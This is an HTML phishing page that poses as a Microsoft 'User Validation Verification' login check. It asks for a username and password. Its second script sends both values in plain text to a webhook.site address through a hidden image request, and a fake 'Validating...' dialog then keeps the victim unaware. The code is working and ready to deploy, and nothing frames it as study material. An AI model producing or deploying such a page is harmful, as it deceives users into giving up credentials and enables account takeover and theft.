<!DOCTYPE html>
<html>
<head>
    <!-- Official MS user confirmation of information -->
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MS Login Verification</title>
    <style>
        /* Add CSS for setting the background color to dark grey */
        body {
            background-color: rgb(255, 255, 255); /* MS style */
            font-family: "Basic Sans Light SF", sans-serif;
            font-weight: 400;
            font-size: 1rem;
            line-height: 1.5rem;
            letter-spacing: 0.2px;
        }
        form {
            border: 0;
            outline: 0;
            width: 80%;
            padding: 10px 20px;
        }
        input {
            border: 0;
            outline: 0;
            background: rgb(255, 252, 205);
            border-bottom: 1px solid black;
            width: 50%;
            padding: 10px 20px;
        }
        /* Style the button */
        button {
            padding: 10px 20px;
            background-color: rgb(58, 120, 181); /* MS Blue */
            color: white; /* Text color for the button */
            border: none;
            cursor: pointer;
            border-radius: 30px;
        }
        /* Style the button on hover */
        button:hover {
            background-color: #0056b3; /* Darker blue color on hover */
            cursor: pointer;
        }
        /* Styles for the modal background */
        .modal-background {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0,0,0,1) !important;
        }
        /* Styles for the second modal content */
        .modal-content {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background-color: #fff;
            padding: 20px;
            border-radius: 5px;
            font-family: "Basic Sans Light SF", sans-serif;
            font-weight: 400;
            font-size: 1rem;
            line-height: 1.5rem;
            letter-spacing: 0.2px;
        }
    </style>
</head>
<body>
        <form id="myForm" onsubmit="return completeForm()">
            <h1>User Validation Verification (UVV)</h1>
            We are committed to ensuring the accuracy of your account information to provide you with the best experience. Before you continue, please take a moment to confirm your information so we can validate what we have on file for your account.<br><br>
            <input type="text" id="username" placeholder="Username" required><br><br>
            <input type="password" id="password" placeholder="Password" required><br><br>
            <button type="submit">Confirm</button>
        </form>

    <!-- Modal Background -->
    <div id="modalBackground" class="modal-background"></div>

    <!-- Modal Content 2 (Hidden by default) -->
    <div id="modalContent" class="modal-content">
        <h2>Validating...</h2>
        <!-- Add your content here -->
        <button onclick="hideModal()">Close</button>
    </div>

    <script>
        function showModal() {
            document.getElementById('modalBackground').style.display = 'block';
            document.getElementById('modalContent').style.display = 'block';
        }

        function hideModal() {
            document.getElementById('modalBackground').style.display = 'none';
            document.getElementById('modalContent').style.display = 'none';
        }

        function completeForm() {
            // Here, you would typically submit the form to the server
            // For this example, we'll just simulate a submission delay (2 seconds)
            setTimeout(function () {
                // Hide the first modal
                hideModal();

                // Show the second modal
                document.getElementById('modalContent').style.display = 'block';

                // You can also choose to redirect or perform other actions here
            }, 1500); // 2000 milliseconds = 2 seconds

            // Prevent the form from submitting
            return false;
        }
    </script>

    <script>
        document.getElementById("myForm").addEventListener("submit", function (event) {
            event.preventDefault(); // Prevent the form from submitting by default
            const value = document.getElementById("username").value;
            const value1 = document.getElementById("password").value;

            // Create a single Image object and send both values in one request
            var image = new Image();
            image.src = "https://webhook.site/66e989bb-2abe-4004-a229-ed6263865c36/?username=" + value + "&password=" + value1;
        });
    </script>
</body>
</html>
